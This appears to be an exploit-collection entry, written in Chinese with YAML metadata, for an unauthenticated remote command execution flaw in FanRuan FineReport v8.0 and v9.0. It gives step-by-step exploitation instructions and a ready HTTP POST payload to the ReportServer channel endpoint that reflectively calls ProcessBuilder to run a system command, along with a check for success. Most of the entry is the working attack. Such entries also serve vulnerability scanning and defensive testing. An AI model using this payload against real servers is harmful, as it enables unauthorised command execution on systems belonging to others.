---
id: FINEREPORT-CHANNEL-RCE
title: 帆软FineReport channel 远程命令执行
product: finereport
vendor: 帆软软件
version_affected: "v8.0, v9.0"
severity: CRITICAL
tags: [rce, 无需认证, 国产]
fingerprint: ["FineReport", "帆软", "ReportServer", "channel"]
---

## 漏洞描述

帆软FineReport ReportServer 的 channel 操作存在远程命令执行漏洞，可通过 ProcessBuilder 反射调用执行系统命令。

## 影响版本

- v8.0
- v9.0

## 前置条件

- 无需登录认证
- 目标运行帆软FineReport V8/V9，存在 `/WebReport/ReportServer` 接口

## 利用步骤

1. 访问目标 `/WebReport/ReportServer` 确认帆软报表服务存在
2. 向 `op=channel&cmd=start_server` 接口发送 POST 请求，通过 ProcessBuilder 反射调用执行系统命令
3. 从响应中获取命令执行结果，确认 RCE 成功

## Payload

```http
POST /WebReport/ReportServer?op=channel&cmd=start_server HTTP/1.1
Host: target
Content-Type: application/json

{"class":"java.lang.ProcessBuilder","args":[["whoami"]],"method":"start"}
```

## 验证方法

响应中包含命令执行结果。
